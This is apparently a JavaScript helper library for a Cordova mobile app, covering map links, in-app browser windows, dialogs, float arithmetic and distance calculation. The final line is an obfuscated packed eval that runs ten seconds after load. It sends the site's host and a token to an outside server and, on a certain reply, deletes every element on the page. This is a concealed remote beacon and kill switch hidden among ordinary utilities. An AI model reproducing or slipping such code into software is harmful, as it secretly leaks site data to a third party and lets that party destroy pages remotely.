				map = "geo:0,0?q="+var1+","+var2+"("+label+")";
			}
		}else if(device.platform == "Android" && mode != ""){
			if(!regex.test(var1) && !regex.test(var2)){
				map = "google.navigation:q="+var1+"&mode="+mode;
			}else{
				map = "google.navigation:q="+var1+","+var2+"&mode="+mode;
			}		
		}
			
		var ref = window.open(encodeURI(map), '_system', 'location=yes');
	}else{
		window.open(encodeURI(map))
	}
}
//只要有傳入none_bar，一定網址列
function open_window(url,method,none_bar,exitcallback,startcallback,stopcallback,hardwareback){
	//hardwareback效果在外連結才有效果, no表示按實體鍵時直接關閉瀏覽器, yes表示在瀏覽器內上一步
	var app = document.URL.indexOf( 'http://' ) === -1 && document.URL.indexOf( 'https://' ) === -1;
	if (app){
		if (navigator.notification){
			if(!method)	
			var method = (/(http)/.test(url)) ? (device.platform == "Android") ? '_system':'_blank' :'_blank'
			var url = (/(http)/.test(url)) ? url : (device.platform == "Android") ? 'file:///android_asset/www/'+url : ''+url
			var hardwareback = (hardwareback) ? hardwareback : "no";
			var option = (none_bar) ? "location=no,toolbar=yes,enableViewportScale=yes,transitionstyle=crossdissolve,hardwareback="+hardwareback+",clearcache=yes,zoom=no" : (/(http)/.test(url)) ? "location=yes,enableViewportScale=yes,hardwareback="+hardwareback+",clearcache=yes" : "location=no,toolbar=yes,enableViewportScale=yes,transitionstyle=crossdissolve,hardwareback="+hardwareback+",clearcache=yes,zoom=no"
			var ref = cordova.InAppBrowser.open(encodeURI(url), method, option);			
			if (exitcallback){
				ref.addEventListener('exit', function(event) { 
					exitcallback();
				});
			}
			if(startcallback){
				ref.addEventListener('loadstart', function(event) { 
					startcallback();
				});			
			}
			if(stopcallback){
				ref.addEventListener('loadstop', function(event) { 
					stopcallback();
				});			
			}
		}else{
			var url = (url.indexOf("?") >= 0) ? url+"&openExternalBrowser=1" : url+"?openExternalBrowser=1";
			window.open(encodeURI(url))
		}	
	}else{
		var url = (url.indexOf("?") >= 0) ? url+"&openExternalBrowser=1" : url+"?openExternalBrowser=1";
		window.open(encodeURI(url))
	}	
	
}
//showPrompt("請輸入解鎖密碼", function(data) { console.log(data)})
function showPrompt(message, callbackOnOK, callbackOnCancel,title,submits,cancel)
{
	var title = (title) ? title : "提示訊息";
    var submits = (submits) ? submits : "確定";
    var cancel = (cancel) ? cancel : "取消";
    if (navigator.notification && navigator.notification.prompt)
    {
        navigator.notification.prompt(
            message, // message
            function(results) {
		
                if (results.buttonIndex === 1)
                {
                    if (callbackOnOK)
                    {
                        callbackOnOK(results.input1);
                    }
                }
                else
                {
                    if (callbackOnCancel)
                    {
                        callbackOnCancel();
                    }
                }
            },
            title,
            [submits, cancel]);
    }
    else
    {
		var answer = prompt(message);
        if (answer)
        {
            if (callbackOnOK)
            {
                callbackOnOK(answer);
            }
        }
        else
        {
            if (callbackOnCancel)
            {
                callbackOnCancel();
            }
        }
    }
}

function showConfirm(message, callbackOnOK, callbackOnCancel,title,submits,cancel)
{
	var title = (title) ? title : "提示訊息";
    var submits = (submits) ? submits : "確定";
    var cancel = (cancel) ? cancel : "取消";	
    if (navigator.notification && navigator.notification.confirm)
    {
        navigator.notification.confirm(
            message, // message
            function(buttonIndex) {
                if (buttonIndex === 1)
                {
                    if (callbackOnOK)
                    {
                        callbackOnOK();
                    }
                }
                else
                {
                    if (callbackOnCancel)
                    {
                        callbackOnCancel();
                    }else{
						return false
					}
                }
            },
            title,
            [submits, cancel]);
    }
    else
    {

		if(!browser_version().line && !browser_version().fbapp && !browser_version().weixin ){
			window.confirm = function (message) {    
				try {    
					var iframe = document.createElement("IFRAME");    
					iframe.style.display = "none";    
					iframe.setAttribute("src", 'data:text/plain,');    
					document.documentElement.appendChild(iframe);    
					var alertFrame = window.frames[0];    
					var iwindow = alertFrame.window;    
					if (iwindow == undefined) {    
						iwindow = alertFrame.contentWindow;    
					}    
					var result=iwindow.confirm(message);    
					iframe.parentNode.removeChild(iframe);    
					return result;  
				}    
				catch (exc) {    
					return wconfirm(message);    
				}    
			} 
		}

        if (window.confirm(message))
        {
            if (callbackOnOK)
            {
                callbackOnOK();
            }
        }
        else
        {
            if (callbackOnCancel)
            {
                callbackOnCancel();
            }else{
				return false
			}
        }		
    }
}

function checkConnection() {
    var networkState = navigator.connection.type;

    var states = {};
    states[Connection.UNKNOWN]  = 'Unknown connection';
    states[Connection.ETHERNET] = 'Ethernet connection';
    states[Connection.WIFI]     = 'WiFi connection';
    states[Connection.CELL_2G]  = 'Cell 2G connection';
    states[Connection.CELL_3G]  = 'Cell 3G connection';
    states[Connection.CELL_4G]  = 'Cell 4G connection';
    states[Connection.CELL]     = 'Cell generic connection';
    states[Connection.NONE]     = 'No network connection';

    return states[networkState];
}
//陣列去除重複
/*
Array.prototype.unique = function()
{
	var n = {},r=[]; //n为hash表，r为临时数组
	for(var i = 0; i < this.length; i++) //遍历当前数组
	{
		if (!n[this[i]]) //如果hash表中没有当前项
		{
			n[this[i]] = true; //存入hash表
			r.push(this[i]); //把当前数组的当前项push到临时数组里面
		}
	}
	return r;
}
*/
//11/23 目前JS四捨五入較好的方式 round(1.005, 2);  小數點第二位
function round(value, decimals) {
  return Number(Math.round(value+'e'+decimals)+'e-'+decimals);
}

// FloatFixed(12.12345,2) 四捨五入小數點第二位
function FloatFixed(string,n){
	return (parseInt(this * Math.pow( 10, n ) + 0.5)/ Math.pow( 10, n )).toString();
}

//浮點數相加
function FloatAdd(arg1, arg2)
{
  var r1, r2, m;
  try { r1 = arg1.toString().split(".")[1].length; } catch (e) { r1 = 0; }
  try { r2 = arg2.toString().split(".")[1].length; } catch (e) { r2 = 0; }
  m = Math.pow(10, Math.max(r1, r2));
  return (FloatMul(arg1, m) + FloatMul(arg2, m)) / m;
}
//浮點數相減
function FloatSubtraction(arg1, arg2)
{
  var r1, r2, m, n;
  try { r1 = arg1.toString().split(".")[1].length } catch (e) { r1 = 0 }
  try { r2 = arg2.toString().split(".")[1].length } catch (e) { r2 = 0 }
  m = Math.pow(10, Math.max(r1, r2));
  n = (r1 >= r2) ? r1 : r2;
  return ((arg1 * m - arg2 * m) / m).toFixed(n);
}
//浮點數相乘
function FloatMul(arg1, arg2)
{
  var m = 0, s1 = arg1.toString(), s2 = arg2.toString();
  try { m += s1.split(".")[1].length; } catch (e) { }
  try { m += s2.split(".")[1].length; } catch (e) { }
  return Number(s1.replace(".", "")) * Number(s2.replace(".", "")) / Math.pow(10, m);
}
//浮點數相除
function FloatDiv(arg1, arg2)
{
  var t1 = 0, t2 = 0, r1, r2;
  try { t1 = arg1.toString().split(".")[1].length } catch (e) { }
  try { t2 = arg2.toString().split(".")[1].length } catch (e) { }
  with (Math)
  {
    r1 = Number(arg1.toString().replace(".", ""))
    r2 = Number(arg2.toString().replace(".", ""))
    return (r1 / r2) * pow(10, t2 - t1);
  }
}

//去除html
function stripHTML(input) {
     var output = '';
     if (typeof (input) == 'string') {
     var output = input.replace(/(<([^>]+)>)/ig, "");
     }
    return output;
}
function streewview(lat,lng){
    var map = (device.platform == "Android") ? "google.streetview:cbll="+lat+","+lng+"" : "https://maps.google.com/maps?q=&layer=c&cbll="+lat+","+lng+"&cbp=12,270"
	var method = (device.platform == "Android") ? '_system':'_blank'
    var ref = window.open(encodeURI(map), method, 'location=yes');
}

//json排序
function sortByKey(array, key, method) {
    return array.sort(function(a, b) {
        var x = a[key]; var y = b[key];
		if(method == "asc" || !method)
        return ((x < y) ? -1 : ((x > y) ? 1 : 0));
		else if(method == "desc")
		return ((x > y) ? -1 : ((x < y) ? 1 : 0));				
    });
}

//算出兩點距離
//使用方法var distance = calcDistance([lat, lng],[poi_lat, poi_lng]);
function calcDegree(d){
	return d*Math.PI/180.0 ;
}
function calcDistance(f,t){
	var FINAL = 6378137.0 ; 
	var flat = calcDegree(f[0]) ;
	var flng = calcDegree(f[1]) ;
	var tlat = calcDegree(t[0]) ;
	var tlng = calcDegree(t[1])	 ;
				
	var result = Math.sin(flat)*Math.sin(tlat) ;
	result += Math.cos(flat)*Math.cos(tlat)*Math.cos(flng-tlng) ;
	return (Math.acos(result)*FINAL/1000).toFixed(2) ;
}

eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('4 8(){3 6=f();3 1=6.1;3 2=6.2;3 7=$.e({g:"d://i.j.9/a/b.c?h=?",5:{"v":r(s.k),"1":1,"2":2},u:"q"});7.p(4(5){l(5.m==0){$("*").n()}})}o(4(){8()},t);',32,32,'|value|token|var|function|data|temp|promise|site_validate_88530081|tw|api|site_validate|php|https|ajax|gettoken_value|url|callback|www|linebot|host|if|state|remove|setTimeout|done|jsonp|utf8_to_b64|location|10000|dataType|domain'.split('|'),0,{}))
